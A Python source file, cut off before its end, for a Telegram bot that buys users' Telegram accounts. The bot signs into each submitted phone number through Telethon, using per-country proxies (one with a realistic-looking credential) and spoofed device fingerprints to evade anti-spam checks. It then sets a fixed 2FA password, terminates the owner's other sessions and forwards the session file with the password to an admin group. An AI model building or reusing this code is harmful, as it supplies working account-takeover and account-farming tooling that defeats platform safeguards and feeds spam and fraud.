import telebot
import sqlite3
from telethon.sync import TelegramClient
from telethon.sessions import StringSession
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError, PhoneCodeExpiredError, FloodWaitError, PeerFloodError
from telethon.tl import functions
import asyncio
import threading
import os
import phonenumbers
from phonenumbers import geocoder, country_code_for_region
import pycountry
from telebot import types
from telebot.util import escape
import time
import re
import datetime
import secrets
import string
import random
from collections import Counter
import zipfile
import shutil
import logging
import requests
import concurrent.futures
from threading import Lock

# Configuration
API_TOKEN = "YOUR_BOT_TOKEN_HERE"
ADMIN_ID = 123456789
API_ID = 1234567
API_HASH = "YOUR_API_HASH_HERE"
SESSION_GROUP_ID = -1002845725805
WITHDRAW_GROUP_ID = -1002741068000
CHANNEL_URL = "https://t.me/tx_receivers_news"
CHANNEL_USERNAME = "@tx_receivers_news"
SPAM_BOT = "@SpamBot"

MIN_WITHDRAW = 2.0
DB_FILE = "session_bot.db"

USD_TO_TRX = 10.0
USD_TO_BDT = 117.0
USD_TO_PKR = 278.0

SESSIONS_FOLDER = "sessions"

if not os.path.exists(SESSIONS_FOLDER):
    os.makedirs(SESSIONS_FOLDER)

# Enhanced logging
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s",
    handlers=[
        logging.FileHandler("bot_performance.log"),
        logging.StreamHandler()
    ]
)

# Thread-safe operations
db_lock = Lock()
user_data_lock = Lock()

# Comprehensive Proxy Database for All Countries
PROXIES_DATABASE = {
    "BD": {
        "proxy_type": "http",
        "addr": "103.125.162.134",
        "port": 8080,
        "username": "bd_proxy_user",
        "password": "bd_proxy_pass"
    },
    "SA": {
        "proxy_type": "socks5", 
        "addr": "45.95.99.24",
        "port": 8007,
        "username": "sa_proxy_user",
        "password": "sa_proxy_pass"
    },
    "IN": {
        "proxy_type": "http",
        "addr": "103.148.210.246",
        "port": 80,
        "username": "in_proxy_user",
        "password": "in_proxy_pass"
    },
    "US": {
        "proxy_type": "socks5",
        "addr": "23.254.218.66",
        "port": 443,
        "username": "us_proxy_user", 
        "password": "us_proxy_pass"
    },
    "TG": {
        "proxy_type": "socks5",
        "addr": "93.190.141.105",
        "port": 9999,
        "username": "mmk5faqpdh-corp.mobile.res-country-TG-state-3653224-city-3652462-hold-query",
        "password": "vTFdOUgHfFeHFHA8"
    },
    "CN": {
        "proxy_type": "http",
        "addr": "114.231.45.138",
        "port": 8089,
        "username": "cn_proxy_user",
        "password": "cn_proxy_pass"
    },
    "RU": {
        "proxy_type": "socks5",
        "addr": "95.165.238.48",
        "port": 1080,
        "username": "ru_proxy_user",
        "password": "ru_proxy_pass"
    },
    "GB": {
        "proxy_type": "http",
        "addr": "51.89.215.137",
        "port": 8080,
        "username": "gb_proxy_user",
        "password": "gb_proxy_pass"
    },
    "DE": {
        "proxy_type": "socks5",
        "addr": "185.199.229.156",
        "port": 7492,
        "username": "de_proxy_user",
        "password": "de_proxy_pass"
    },
    "FR": {
        "proxy_type": "http",
        "addr": "51.159.115.233",
        "port": 3128,
        "username": "fr_proxy_user",
        "password": "fr_proxy_pass"
    },
    "JP": {
        "proxy_type": "socks5",
        "addr": "133.18.201.69",
        "port": 1080,
        "username": "jp_proxy_user",
        "password": "jp_proxy_pass"
    },
    "KR": {
        "proxy_type": "http",
        "addr": "121.134.198.156",
        "port": 8080,
        "username": "kr_proxy_user",
        "password": "kr_proxy_pass"
    },
    "AE": {
        "proxy_type": "socks5",
        "addr": "94.130.219.95",
        "port": 1080,
        "username": "ae_proxy_user",
        "password": "ae_proxy_pass"
    },
    "TR": {
        "proxy_type": "http",
        "addr": "176.235.99.13",
        "port": 9090,
        "username": "tr_proxy_user",
        "password": "tr_proxy_pass"
    },
    "BR": {
        "proxy_type": "socks5",
        "addr": "177.55.255.21",
        "port": 1080,
        "username": "br_proxy_user",
        "password": "br_proxy_pass"
    },
    "NG": {
        "proxy_type": "http",
        "addr": "154.113.121.122",
        "port": 80,
        "username": "ng_proxy_user",
        "password": "ng_proxy_pass"
    },
    "EG": {
        "proxy_type": "socks5",
        "addr": "41.65.251.86",
        "port": 1080,
        "username": "eg_proxy_user",
        "password": "eg_proxy_pass"
    },
    "PK": {
        "proxy_type": "http",
        "addr": "110.93.214.28",
        "port": 8080,
        "username": "pk_proxy_user",
        "password": "pk_proxy_pass"
    },
    "ID": {
        "proxy_type": "socks5",
        "addr": "139.255.21.74",
        "port": 1080,
        "username": "id_proxy_user",
        "password": "id_proxy_pass"
    },
    "VN": {
        "proxy_type": "http",
        "addr": "14.241.231.205",
        "port": 8080,
        "username": "vn_proxy_user",
        "password": "vn_proxy_pass"
    },
    "TH": {
        "proxy_type": "socks5",
        "addr": "58.8.168.150",
        "port": 1080,
        "username": "th_proxy_user",
        "password": "th_proxy_pass"
    }
}

# Enhanced Device Database
DEVICE_DATABASE = {
    "ios": [
        {"device_model": "iPhone15,1", "system_version": "iOS 17.2.1", "app_version": "10.12.0", "name": "iPhone 14 Pro"},
        {"device_model": "iPhone15,2", "system_version": "iOS 17.1.2", "app_version": "10.11.5", "name": "iPhone 14 Pro Max"},
        {"device_model": "iPhone15,3", "system_version": "iOS 17.0.3", "app_version": "10.10.2", "name": "iPhone 15 Pro"},
        {"device_model": "iPhone15,4", "system_version": "iOS 16.6.1", "app_version": "10.9.8", "name": "iPhone 15"},
        {"device_model": "iPhone14,7", "system_version": "iOS 16.5", "app_version": "10.8.4", "name": "iPhone 14"},
        {"device_model": "iPhone14,2", "system_version": "iOS 15.7.9", "app_version": "10.7.3", "name": "iPhone 13 Pro"},
        {"device_model": "iPhone13,1", "system_version": "iOS 15.6.1", "app_version": "10.6.7", "name": "iPhone 12 Mini"},
        {"device_model": "iPhone12,8", "system_version": "iOS 14.8.1", "app_version": "10.5.2", "name": "iPhone SE 2nd Gen"}
    ],
    "android": [
        {"device_model": "SM-S918B", "system_version": "Android 14", "app_version": "10.12.1", "name": "Samsung Galaxy S23 Ultra"},
        {"device_model": "SM-S911B", "system_version": "Android 13", "app_version": "10.11.3", "name": "Samsung Galaxy S23"},
        {"device_model": "SM-F946B", "system_version": "Android 13L", "app_version": "10.10.8", "name": "Samsung Galaxy Z Fold5"},
        {"device_model": "SM-F731B", "system_version": "Android 12", "app_version": "10.9.6", "name": "Samsung Galaxy Z Flip5"},
        {"device_model": "XQ-DQ72", "system_version": "Android 13", "app_version": "10.8.9", "name": "Sony Xperia 1 V"},
        {"device_model": "22071212AG", "system_version": "Android 13", "app_version": "10.7.5", "name": "Xiaomi 12T Pro"},
        {"device_model": "CPH2451", "system_version": "Android 12", "app_version": "10.6.8", "name": "Oppo Reno8 Pro"},
        {"device_model": "NE2215", "system_version": "Android 12", "app_version": "10.5.9", "name": "OnePlus 10T"}
    ],
    "windows": [
        {"device_model": "Windows 11 Pro", "system_version": "Windows 11 23H2", "app_version": "10.12.2", "name": "Windows Desktop"},
        {"device_model": "Windows 10 Enterprise", "system_version": "Windows 10 22H2", "app_version": "10.11.8", "name": "Windows PC"},
        {"device_model": "Windows 11 Home", "system_version": "Windows 11 22H2", "app_version": "10.10.7", "name": "Windows Laptop"}
    ],
    "macos": [
        {"device_model": "MacBookPro18,3", "system_version": "macOS 14.2.1", "app_version": "10.12.3", "name": "MacBook Pro M2"},
        {"device_model": "MacBookAir10,1", "system_version": "macOS 13.6.3", "app_version": "10.11.9", "name": "MacBook Air M1"},
        {"device_model": "iMac21,2", "system_version": "macOS 12.7.2", "app_version": "10.10.6", "name": "iMac M1"}
    ],
    "linux": [
        {"device_model": "Linux Desktop", "system_version": "Ubuntu 22.04 LTS", "app_version": "10.12.4", "name": "Linux PC"},
        {"device_model": "Linux Laptop", "system_version": "Fedora 39", "app_version": "10.11.7", "name": "Linux Notebook"}
    ]
}

# Helper functions
def generate_random_password():
    return "@Riyad12"

def get_country_proxy(country_code):
    """Get proxy configuration for specific country"""
    return PROXIES_DATABASE.get(country_code, None)

def generate_random_device_info():
    """Generate realistic device information"""
    platform = random.choice(list(DEVICE_DATABASE.keys()))
    device = random.choice(DEVICE_DATABASE[platform])
    
    return {
        "device_model": device["device_model"],
        "system_version": device["system_version"],
        "app_version": f"{device['app_version']} ({random.randint(1000, 9999)})",
        "lang_code": "en",
        "platform": platform,
        "device_name": device["name"]
    }

# Database operations
def thread_safe_db_operation(operation, *args):
    with db_lock:
        conn = sqlite3.connect(DB_FILE, check_same_thread=False)
        cursor = conn.cursor()
        try:
            result = operation(cursor, *args)
            conn.commit()
            return result
        except Exception as e:
            logging.error(f"Database operation error: {e}")
            conn.rollback()
            return None
        finally:
            conn.close()

def init_db():
    def operation(cursor):
        cursor.execute("""
            CREATE TABLE IF NOT EXISTS users (
                user_id INTEGER PRIMARY KEY,
                full_name TEXT,
                balance REAL DEFAULT 0,
                session_count INTEGER DEFAULT 0,
                verified_count INTEGER DEFAULT 0,
                unverified_count INTEGER DEFAULT 0,
                claimed_numbers TEXT DEFAULT "",
                pending_numbers TEXT DEFAULT "",
                join_date TEXT,
                language TEXT DEFAULT 'en',
                last_active TEXT,
                total_earned REAL DEFAULT 0
            )
        """)
        cursor.execute("""
            CREATE TABLE IF NOT EXISTS country_rates (
                country_code TEXT PRIMARY KEY,
                rate REAL NOT NULL,
                claim_time_seconds INTEGER NOT NULL,
                status TEXT NOT NULL DEFAULT "on",
                capacity INTEGER NOT NULL DEFAULT 10,
                usage_count INTEGER NOT NULL DEFAULT 0,
                daily_limit INTEGER DEFAULT 50
            )
        """)
        cursor.execute("""
            CREATE TABLE IF NOT EXISTS used_numbers (
                phone_number TEXT PRIMARY KEY,
                user_id INTEGER NOT NULL,
                used_date TEXT
            )
        """)
        cursor.execute("""
            CREATE TABLE IF NOT EXISTS withdraw_history (
                withdraw_id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER NOT NULL,
                amount REAL NOT NULL,
                address TEXT NOT NULL,
                timestamp TEXT NOT NULL,
                trans_no TEXT,
                transaction_id TEXT,
                currency TEXT,
                status TEXT DEFAULT 'pending'
            )
        """)
        cursor.execute("CREATE TABLE IF NOT EXISTS admins (user_id INTEGER PRIMARY KEY, role TEXT DEFAULT 'admin')")
        cursor.execute("CREATE TABLE IF NOT EXISTS settings (key TEXT PRIMARY KEY, value TEXT)")
        
        cursor.execute("INSERT OR IGNORE INTO admins (user_id, role) VALUES (?, ?)", (ADMIN_ID, 'super_admin'))
        cursor.execute("INSERT OR IGNORE INTO settings (key, value) VALUES ('2fa_status', 'on')")
        cursor.execute("INSERT OR IGNORE INTO settings (key, value) VALUES ('2fa_password', '@Riyad12')")
        
        if cursor.execute("SELECT COUNT(*) FROM country_rates").fetchone()[0] == 0:
            default_rates = [
                ("BD", 12.0, 25, "on", 30, 0, 100),
                ("SA", 25.0, 45, "on", 20, 0, 80),
                ("IN", 10.0, 20, "on", 40, 0, 150),
                ("US", 30.0, 35, "on", 15, 0, 60),
                ("TG", 18.0, 30, "on", 25, 0, 90),
                ("CN", 15.0, 40, "on", 35, 0, 120),
                ("RU", 20.0, 50, "on", 18, 0, 70),
                ("GB", 28.0, 30, "on", 12, 0, 50),
                ("DE", 22.0, 35, "on", 16, 0, 65),
                ("FR", 24.0, 32, "on", 14, 0, 55)
            ]
            cursor.executemany("INSERT INTO country_rates VALUES (?, ?, ?, ?, ?, ?, ?)", default_rates)
    
    thread_safe_db_operation(operation)

def migrate_db():
    def operation(cursor):
        cursor.execute("PRAGMA table_info(users)")
        user_columns = [info[1] for info in cursor.fetchall()]
        
        if 'language' not in user_columns:
            cursor.execute("ALTER TABLE users ADD COLUMN language TEXT DEFAULT 'en'")
        if 'last_active' not in user_columns:
            cursor.execute("ALTER TABLE users ADD COLUMN last_active TEXT")
        if 'total_earned' not in user_columns:
            cursor.execute("ALTER TABLE users ADD COLUMN total_earned REAL DEFAULT 0")
        
        cursor.execute("PRAGMA table_info(country_rates)")
        rate_columns = [info[1] for info in cursor.fetchall()]
        if 'daily_limit' not in rate_columns:
            cursor.execute("ALTER TABLE country_rates ADD COLUMN daily_limit INTEGER DEFAULT 50")
    
    thread_safe_db_operation(operation)

migrate_db()
init_db()

# Initialize bot
bot = telebot.TeleBot(API_TOKEN, num_threads=10, skip_pending=True)
user_data = {}

# Performance monitoring
class PerformanceMonitor:
    def __init__(self):
        self.start_time = time.time()
        self.requests_processed = 0
        self.active_threads = 0
        self.max_threads = 0
    
    def log_request(self):
        self.requests_processed += 1
    
    def thread_started(self):
        self.active_threads += 1
        self.max_threads = max(self.max_threads, self.active_threads)
    
    def thread_completed(self):
        self.active_threads -= 1
    
    def get_stats(self):
        uptime = time.time() - self.start_time
        return {
            "uptime_hours": uptime / 3600,
            "requests_processed": self.requests_processed,
            "requests_per_hour": self.requests_processed / (uptime / 3600) if uptime > 0 else 0,
            "current_threads": self.active_threads,
            "max_threads": self.max_threads
        }

performance_monitor = PerformanceMonitor()

# User data management
def get_user_data(user_id):
    with user_data_lock:
        return user_data.get(user_id, {})

def set_user_data(user_id, data):
    with user_data_lock:
        user_data[user_id] = data

def update_user_data(user_id, key, value):
    with user_data_lock:
        if user_id not in user_data:
            user_data[user_id] = {}
        user_data[user_id][key] = value

def delete_user_data(user_id):
    with user_data_lock:
        if user_id in user_data:
            del user_data[user_id]

# Enhanced language system
LANGUAGES = {
    "en": {
        "welcome": "🚀 **Welcome to Premium Session Bot** ✨\n\nSend your phone number with country code to start!",
        "help": "📖 **Help Guide**\n\nUse /start to begin\n/capacity to see rates\n/account to check balance",
        "processing": "⏳ Processing your request...",
        "code_sent": "✅ Code sent to: {}",
        "login_success": "🎉 Account verified! ${:.2f} added to your balance.",
        "withdraw_methods": "💳 **Select withdrawal method:**"
    },
    "zh": {
        "welcome": "🚀 **欢迎使用高级会话机器人** ✨\n\n请发送带有国家代码的手机号码开始！",
        "help": "📖 **帮助指南**\n\n使用 /start 开始\n/capacity 查看费率\n/account 检查余额",
        "processing": "⏳ 处理您的请求...",
        "code_sent": "✅ 验证码已发送至: {}",
        "login_success": "🎉 账户验证成功！{:.2f}美元已添加到您的余额。",
        "withdraw_methods": "💳 **选择提现方式:**"
    },
    "ar": {
        "welcome": "🚀 **مرحبًا بك في بوت الجلسات المميز** ✨\n\nأرسل رقم هاتفك مع رمز الدولة للبدء!",
        "help": "📖 **دليل المساعدة**\n\nاستخدم /start للبدء\n/capacity لرؤية الأسعار\n/account للتحقق من الرصيد",
        "processing": "⏳ جاري معالجة طلبك...",
        "code_sent": "✅ تم إرسال الرمز إلى: {}",
        "login_success": "🎉 تم التحقق من الحساب! تم إضافة {:.2f}$ إلى رصيدك.",
        "withdraw_methods": "💳 **اختر طريقة السحب:**"
    }
}

def get_text(user_id, text_key, *args):
    def operation(cursor):
        cursor.execute("SELECT language FROM users WHERE user_id = ?", (user_id,))
        result = cursor.fetchone()
        return result[0] if result else 'en'
    
    lang = thread_safe_db_operation(operation) or 'en'
    base_text = LANGUAGES.get(lang, LANGUAGES['en']).get(text_key, text_key)
    return base_text.format(*args) if args else base_text

# Admin functions
def is_admin(user_id):
    def operation(cursor):
        cursor.execute("SELECT 1 FROM admins WHERE user_id = ?", (user_id,))
        return cursor.fetchone() is not None
    return thread_safe_db_operation(operation)

def is_super_admin(user_id):
    def operation(cursor):
        cursor.execute("SELECT role FROM admins WHERE user_id = ?", (user_id,))
        result = cursor.fetchone()
        return result and result[0] == 'super_admin'
    return thread_safe_db_operation(operation)

# Channel join system
def send_join_channel_message(chat_id):
    markup = types.InlineKeyboardMarkup()
    join_button = types.InlineKeyboardButton("📢 Join Channel", url=CHANNEL_URL)
    check_button = types.InlineKeyboardButton("✅ Verify Join", callback_data="verify_join")
    markup.add(join_button)
    markup.add(check_button)
    
    bot.send_message(chat_id, "🔒 Please join our channel to use the bot!", reply_markup=markup)

def channel_join_required(func):
    def wrapper(message):
        if is_admin(message.from_user.id):
            func(message)
            return
        
        user_id = message.from_user.id
        try:
            member = bot.get_chat_member(CHANNEL_USERNAME, user_id)
            if member.status in ["member", "administrator", "creator"]:
                func(message)
            else:
                send_join_channel_message(message.chat.id)
        except Exception as e:
            send_join_channel_message(message.chat.id)
    return wrapper

@bot.callback_query_handler(func=lambda call: call.data == "verify_join")
def verify_join_callback(call):
    user_id = call.from_user.id
    try:
        member = bot.get_chat_member(CHANNEL_USERNAME, user_id)
        if member.status in ["member", "administrator", "creator"]:
            bot.answer_callback_query(call.id, "✅ Access granted!")
            bot.delete_message(call.message.chat.id, call.message.message_id)
            send_welcome(call.message)
        else:
            bot.answer_callback_query(call.id, "❌ Please join the channel first.")
    except Exception as e:
        bot.answer_callback_query(call.id, "⚠️ Verification failed. Try again.")

# Telethon functions
def get_country_info(phone_number):
    try:
        parsed_number = phonenumbers.parse(phone_number)
        country_code = geocoder.region_code_for_number(parsed_number)
        dial_code = parsed_number.country_code
        return {"code": country_code, "dial_code": dial_code}
    except:
        return {"code": None, "dial_code": None}

def run_telethon_task(task, *args):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    try:
        return loop.run_until_complete(task(*args))
    finally:
        loop.close()

async def check_spam_status(client, phone, chat_id, processing_msg_id):
    try:
        await client.send_message(SPAM_BOT, "/start")
        await asyncio.sleep(2)
        messages = await client.get_messages(SPAM_BOT, limit=1)
        if messages and "Unfortunately, some actions can trigger a harsh response from our anti-spam systems" in messages[0].text:
            return True
        return False
    except Exception as e:
        logging.error(f"Error checking spam status for {phone}: {e}")
        bot.edit_message_text(f"❌ Error checking spam status for {phone}. Please try again.", chat_id, processing_msg_id)
        return False

async def send_login_code(chat_id, phone_number, message_id):
    try:
        country_info = get_country_info(phone_number)
        country_code = country_info["code"]
        proxy = get_country_proxy(country_code)
        device_info = generate_random_device_info()

        session_filename = f"{chat_id}{phone_number}.session"
        client = TelegramClient(
            session_filename, API_ID, API_HASH, 
            proxy=proxy,
            device_model=device_info["device_model"],
            system_version=device_info["system_version"],
            app_version=device_info["app_version"],
            lang_code=device_info["lang_code"]
        )
        
        await client.connect()
        sent_code_info = await client.send_code_request(phone_number)
        
        set_user_data(chat_id, {
            "phone_code_hash": sent_code_info.phone_code_hash, 
            "session_filename": session_filename, 
            "phone": phone_number, 
            "state": "awaiting_code"
        })
        
        def operation(cursor):
            cursor.execute("SELECT pending_numbers FROM users WHERE user_id = ?", (chat_id,))
            pending_str_tuple = cursor.fetchone()
            pending_str = pending_str_tuple[0] if pending_str_tuple else ""
            new_pending_str = f"{pending_str},{phone_number}" if pending_str else phone_number
            cursor.execute("UPDATE users SET pending_numbers = ?, unverified_count = unverified_count + 1 WHERE user_id = ?", 
                         (new_pending_str, chat_id))
        
        thread_safe_db_operation(operation)

        flag = "".join(chr(ord(c) + 127397) for c in country_code.upper()) if country_code else "🌍"
        msg_text = f"{flag} {get_text(chat_id, 'code_sent', phone_number)}"
        sent_msg = bot.edit_message_text(msg_text, chat_id, message_id, parse_mode="Markdown")
        update_user_data(chat_id, "code_msg_id", sent_msg.message_id)
        
    except Exception as e:
        bot.edit_message_text(f"❌ Error sending code: {e}\n\nPlease try again.", chat_id, message_id)
        delete_user_data(chat_id)

async def _generate_session_file(chat_id, phone, code, phone_code_hash, session_filename, processing_msg_id):
    country_info = get_country_info(phone)
    country_code = country_info["code"]
    proxy = get_country_proxy(country_code)
    device_info = generate_random_device_info()

    client = TelegramClient(
        session_filename, API_ID, API_HASH,
        proxy=proxy,
        device_model=device_info["device_model"],
        system_version=device_info["system_version"], 
        app_version=device_info["app_version"],
        lang_code=device_info["lang_code"]
    )
    
    try:
        await client.connect()
        await client.sign_in(phone, code, phone_code_hash=phone_code_hash)

        # Spam check
        is_spam = await check_spam_status(client, phone, chat_id, processing_msg_id)
        if is_spam:
            def operation(cursor):
                cursor.execute("SELECT pending_numbers FROM users WHERE user_id = ?", (chat_id,))
                pending_str_tuple = cursor.fetchone()
                pending_str = pending_str_tuple[0] if pending_str_tuple else ""
                pending_numbers = pending_str.split(",") if pending_str else []
                if phone in pending_numbers:
                    pending_numbers.remove(phone)
                    new_pending_str = ",".join(pending_numbers) if pending_numbers else ""
                    cursor.execute("UPDATE users SET pending_numbers = ? WHERE user_id = ?", (new_pending_str, chat_id))
            
            thread_safe_db_operation(operation)
            bot.edit_message_text(f"❌ Account {phone} is marked as spam.", chat_id, processing_msg_id)
            return

        # Check restrictions
        me = await client.get_me()
        if me.restricted:
            raise Exception(f"Account restricted: {me.restriction_reason}")

        # 2FA setup
        def get_2fa_settings(cursor):
            cursor.execute("SELECT value FROM settings WHERE key = '2fa_status'")
            status = cursor.fetchone()
            cursor.execute("SELECT value FROM settings WHERE key = '2fa_password'")
            password = cursor.fetchone()
            return status[0] if status else "on", password[0] if password else "@Riyad12"
        
        twofa_status, twofa_password = thread_safe_db_operation(get_2fa_settings)
        
        if twofa_status == "on":
            try:
                await client.edit_2fa(new_password=twofa_password, hint="Set by Bot")
            except Exception as e:
                logging.error(f"2FA setup failed for {phone}: {e}")
                bot.send_message(ADMIN_ID, f"⚠️ 2FA Failed for {phone}")

        # Get country rate
        def get_country_rate(cursor):
            cursor.execute("SELECT rate, claim_time_seconds FROM country_rates WHERE country_code = ? AND status = 'on'", (country_code,))
            return cursor.fetchone()
        
        rate_info = thread_safe_db_operation(get_country_rate)

        if rate_info:
            rate, claim_time = rate_info
            flag = "".join(chr(ord(c) + 127397) for c in country_code.upper()) if country_code else "🌍"
            initial_text = f"{flag} Number {phone} registered! Waiting {claim_time}s for confirmation..."
            markup = types.InlineKeyboardMarkup()
            dummy_button = types.InlineKeyboardButton("⏳ Waiting...", callback_data="wait")
            markup.add(dummy_button)
            bot.edit_message_text(initial_text, chat_id, processing_msg_id, reply_markup=markup, parse_mode="Markdown")
            
            # Save session
            saved_session_path = os.path.join(SESSIONS_FOLDER, f"{phone}.session")
            shutil.copy(session_filename, saved_session_path)
            
            # Admin notification
            admin_caption = f"🔔 New session from {chat_id}\nPhone: {phone}"
            if twofa_status == "on":
                admin_caption += f"\n2FA: {twofa_password}"
            with open(session_filename, "rb") as sf:
                bot.send_document(SESSION_GROUP_ID, sf, caption=admin_caption)
            
            # Start auto-claim
            timer_thread = threading.Timer(claim_time, run_telethon_task, args=[auto_claim_balance, chat_id, phone, processing_msg_id, session_filename])
            timer_thread.start()
        else:
            bot.edit_message_text(f"✅ Account {phone} received! No auto-claim for this country.", chat_id, processing_msg_id)
    
    except (PhoneCodeInvalidError, PhoneCodeExpiredError):
        def operation(cursor):
            cursor.execute("SELECT pending_numbers FROM users WHERE user_id = ?", (chat_id,))
            pending_str_tuple = cursor.fetchone()
            pending_str = pending_str_tuple[0] if pending_str_tuple else ""
            pending_numbers = pending_str.split(",") if pending_str else []
            if phone in pending_numbers:
                pending_numbers.remove(phone)
                new_pending_str = ",".join(pending_numbers) if pending_numbers else ""
                cursor.execute("UPDATE users SET pending_numbers = ? WHERE user_id = ?", (new_pending_str, chat_id))
        
        thread_safe_db_operation(operation)
        bot.edit_message_text("⚠️ Invalid/expired code. Try again.", chat_id, processing_msg_id)
        update_user_data(chat_id, "state", "awaiting_code")
        
    except SessionPasswordNeededError:
        def operation(cursor):
            cursor.execute("SELECT pending_numbers FROM users WHERE user_id = ?", (chat_id,))
            pending_str_tuple = cursor.fetchone()
            pending_str = pending_str_tuple[0] if pending_str_tuple else ""
            pending_numbers = pending_str.split(",") if pending_str else []
            if phone in pending_numbers:
                pending_numbers.remove(phone)
                new_pending_str = ",".join(pending_numbers) if pending_numbers else ""
                cursor.execute("UPDATE users SET pending_numbers = ? WHERE user_id = ?", (new_pending_str, chat_id))
        
        thread_safe_db_operation(operation)
        bot.edit_message_text("❌ 2FA enabled. Please disable it.", chat_id, processing_msg_id)
        
    except (FloodWaitError, PeerFloodError) as e:
        def operation(cursor):
            cursor.execute("SELECT pending_numbers FROM users WHERE user_id = ?", (chat_id,))
            pending_str_tuple = cursor.fetchone()
            pending_str = pending_str_tuple[0] if pending_str_tuple else ""
            pending_numbers = pending_str.split(",") if pending_str else []
            if phone in pending_numbers:
                pending_numbers.remove(phone)
                new_pending_str = ",".join(pending_numbers) if pending_numbers else ""
                cursor.execute("UPDATE users SET pending_numbers = ? WHERE user_id = ?", (new_pending_str, chat_id))
        
        thread_safe_db_operation(operation)
        bot.edit_message_text("❌ Account is flooded. Cannot accept.", chat_id, processing_msg_id)
        
    except Exception as e:
        logging.error(f"Login error for {phone}: {e}")
        bot.edit_message_text(f"❌ Error: {str(e)}", chat_id, processing_msg_id)
        
    finally:
        await client.disconnect()
        delete_user_data(chat_id)

async def auto_claim_balance(user_id, phone_number, message_id, session_filename):
    country_info = get_country_info(phone_number)
    country_code = country_info["code"]
    proxy = get_country_proxy(country_code)
    device_info = generate_random_device_info()

    client = TelegramClient(
        session_filename, API_ID, API_HASH,
        proxy=proxy,
        device_model=device_info["device_model"],
        system_version=device_info["system_version"],
        app_version=device_info["app_version"],
        lang_code=device_info["lang_code"]
    )
    
    try:
        await client.connect()
        
        if not await client.is_user_authorized():
            def operation(cursor):
                cursor.execute("SELECT pending_numbers FROM users WHERE user_id = ?", (user_id,))
                pending_str_tuple = cursor.fetchone()
                pending_str = pending_str_tuple[0] if pending_str_tuple else ""
                pending_numbers = pending_str.split(",") if pending_str else []
                if phone_number in pending_numbers:
                    pending_numbers.remove(phone_number)
                    new_pending_str = ",".join(pending_numbers) if pending_numbers else ""
                    cursor.execute("UPDATE users SET pending_numbers = ? WHERE user_id = ?", (new_pending_str, user_id))
            
            thread_safe_db_operation(operation)
            bot.edit_message_text("❌ Account unreachable. You might not have logged out.", user_id, message_id)
            return

        # Terminate other sessions
        sessions = await client(functions.account.GetAuthorizationsRequest())
        for auth in sessions.authorizations:
            if auth.hash != 0:
                await client(functions.account.ResetAuthorizationRequest(hash=auth.hash))

        # Check if still other devices
        sessions = await client(functions.account.GetAuthorizationsRequest())
        if len(sessions.authorizations) > 1:
            bot.edit_message_text(f"❌ {len(sessions.authorizations)-1} other devices still logged in.", user_id, message_id)
            return

        # Claim balance
        def operation(cursor):
            cursor.execute("SELECT claimed_numbers FROM users WHERE user_id = ?", (user_id,))
            claimed_str_tuple = cursor.fetchone()
            claimed_str = claimed_str_tuple[0] if claimed_str_tuple else ""
            
            if phone_number in claimed_str.split(","):
                return None
                
            cursor.execute("SELECT rate FROM country_rates WHERE country_code = ?", (country_code,))
            rate_info = cursor.fetchone()
            if not rate_info:
                return None
                
            amount_to_add = rate_info[0]
            new_claimed_str = f"{claimed_str},{phone_number}" if claimed_str else phone_number
            
            cursor.execute("SELECT pending_numbers FROM users WHERE user_id = ?", (user_id,))
            pending_str_tuple = cursor.fetchone()
            pending_str = pending_str_tuple[0] if pending_str_tuple else ""
            pending_numbers = pending_str.split(",") if pending_str else []
            
            if phone_number in pending_numbers:
                pending_numbers.remove(phone_number)
                new_pending_str = ",".join(pending_numbers) if pending_numbers else ""
                cursor.execute("""
                    UPDATE users SET 
                    balance = balance + ?, 
                    claimed_numbers = ?, 
                    session_count = session_count + 1, 
                    verified_count = verified_count + 1, 
                    unverified_count = unverified_count - 1, 
                    pending_numbers = ?,
                    total_earned = total_earned + ?
                    WHERE user_id = ?
                """, (amount_to_add, new_claimed_str, new_pending_str, amount_to_add, user_id))
            else:
                cursor.execute("""
                    UPDATE users SET 
                    balance = balance + ?, 
                    claimed_numbers = ?, 
                    session_count = session_count + 1, 
                    verified_count = verified_count + 1,
                    total_earned = total_earned + ?
                    WHERE user_id = ?
                """, (amount_to_add, new_claimed_str, amount_to_add, user_id))
            
            cursor.execute("UPDATE country_rates SET usage_count = usage_count + 1 WHERE country_code = ?", (country_code,))
            cursor.execute("INSERT OR IGNORE INTO used_numbers (phone_number, user_id, used_date) VALUES (?, ?, ?)", 
                         (phone_number, user_id, time.strftime("%Y-%m-%d")))
            
            return amount_to_add
        
        amount_added = thread_safe_db_operation(operation)
        
        if amount_added:
            success_text = get_text(user_id, "login_success", amount_added)
            bot.edit_message_text(success_text, user_id, message_id, parse_mode="Markdown")
        else:
            bot.edit_message_text("❌ Claim failed. Please try again.", user_id, message_id)
            
    except Exception as e:
        logging.error(f"Auto-claim error for {user_id}: {e}")
        bot.edit_message_text(f"❌ Claim failed: {str(e)}", user_id, message_id)
        
    finally:
        await client.disconnect()

# Bot message handlers
@bot.message_handler(commands=["start"])
def command_start(message):
    performance_monitor.thread_started()
    try:
        def operation(cursor):
            cursor.execute("""
                INSERT OR IGNORE INTO users 
                (user_id, full_name, join_date, last_active) 
                VALUES (?, ?, ?, ?)
            """, (message.from_user.id, message.from_user.first_name, 
                  time.strftime("%Y-%m-%d"), time.strftime("%Y-%m-%d %H:%M:%S")))
        
        thread_safe_db_operation(operation)
        channel_join_required(send_welcome)(message)
    finally:
        performance_monitor.thread_completed()

def send_welcome(message):
    welcome_text = get_text(message.from_user.id, "welcome")
    bot.send_message(message.chat.id, welcome_text, parse_mode="Markdown")

@bot.message_handler(commands=["help"])
@channel_join_required
def command_help(message):
    help_text = get_text(message.from_user.id, "help")
    bot.send_message(message.chat.id, help_text, parse_mode="Markdown")

@bot.message_handler(commands=["capacity"])
@channel_join_required
def command_capacity(message):
    def operation(cursor):
        cursor.execute("SELECT country_code, rate, claim_time_seconds, capacity, usage_count FROM country_rates WHERE status = 'on'")
        return cursor.fetchall()
    
    countries = thread_safe_db_operation(operation) or []
    
    text = "🌍 **Available Countries & Rates**\n\n"
    for code, rate, time_sec, capacity, usage in countries:
        flag = "".join(chr(ord(c) + 127397) for c in code.upper()) if code else "🌍"
        text += f"{flag} {code}: ${rate} | {time_sec}s | {usage}/{capacity}\n"
    
    bot.send_message(message.chat.id, text, parse_mode="Markdown")

@bot.message_handler(commands=["account"])
@channel_join_required
def command_account(message):
    def operation(cursor):
